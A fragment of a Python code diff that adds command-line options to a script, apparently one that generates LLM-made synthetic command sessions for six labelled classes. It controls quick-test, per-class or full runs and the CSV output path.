+    parser = argparse.ArgumentParser(description="Generate LLM Synthetic Data")
+    parser.add_argument("--full", action="store_true", help="Generate full dataset using CLASS_CONFIG target_count for ALL classes")
+    parser.add_argument("--class_id", type=int, choices=[0,1,2,3,4,5], help="Generate full target_count for a specific class only")
+    parser.add_argument('--output', type=str, default='data/exports/synthetic_batches.csv', help="Where to save the CSV")
+    args = parser.parse_args()
 
-    print("Testing LLM Synthetic Generator (New Architecture)...")
+    if args.class_id is not None:
+        count = CLASS_CONFIG[args.class_id]["target_count"]
+        print(f"Generating Class {args.class_id} ({CLASS_CONFIG[args.class_id]['name']}): {count} sessions...")
+        test_counts = {args.class_id: count}
+    elif args.full:
+        total = sum(cfg["target_count"] for cfg in CLASS_CONFIG.values())
+        print(f"Starting FULL generation ({total} sessions across all classes)...")
+        test_counts = {cid: cfg["target_count"] for cid, cfg in CLASS_CONFIG.items()}
+    else:
+        print("Starting QUICK TEST (5 sessions per class). Use --class_id N or --full for real generation.")
+        test_counts = {0: 3, 1: 3, 2: 3, 3: 4, 4: 3, 5: 3}
+
+    print(f"Output will be saved to: {args.output}")
+
     df = asyncio.run(generate_synthetic_sessions_llm(
         config=config,
         n_per_class=test_counts,
         random_seed=42,
         max_retries=2,
         validation_enabled=True,
+        output_path=args.output
     ))
 
-    print("\nGenerated sessions:")
-    print(df[["session_id", "label_name", "num_commands", "commands"]].head())
+    if not df.empty:
+        print("\nGenerated sessions preview:")
+        print(df[["session_id", "label_name", "num_commands", "commands"]].head())
